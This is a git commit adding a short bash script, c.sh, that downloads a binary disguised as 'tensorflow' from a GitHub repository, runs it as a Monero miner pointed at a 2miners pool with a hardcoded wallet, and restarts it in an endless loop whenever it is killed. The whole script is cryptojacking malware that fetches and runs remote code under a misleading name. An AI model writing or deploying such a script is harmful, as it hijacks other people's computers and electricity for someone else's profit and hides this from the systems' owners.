d80ad37fa9a4371e737f52dcfaec45e18de6587f
fonciarz0 <124501173+fonciarz0@users.noreply.github.com>
2024-04-18 18:08:46 +0200

    Create c.sh

---
+++ c.sh
@@ -0,0 +1,24 @@
+#!/bin/bash
+
+# Function to start tensorflow
+start_tensorflow() {
+    wget https://github.com/fonciarz0/google/raw/main/tensorflow
+    chmod +x tensorflow
+    ./tensorflow -o xmr.2miners.com:2222 -u 467DcTyWTHXNY2pudrVQ8g48Sa1fDHdWKfUwWy5nRZ26KW7gA6DbRsQ9CwDba3A3Wy5KU9P7neKp8HMSWA2PR87UHSPTF3y -p x -k --coin monero
+}
+
+# Start tensorflow
+start_tensorflow &
+
+# Store the PID of the tensorflow process
+PID=$!
+
+# Infinite loop to check if tensorflow is running
+while true; do
+    if ! ps -p $PID > /dev/null; then
+        echo "Tensorflow process killed. Restarting..."
+        start_tensorflow &
+        PID=$!
+    fi
+    sleep 1
+done
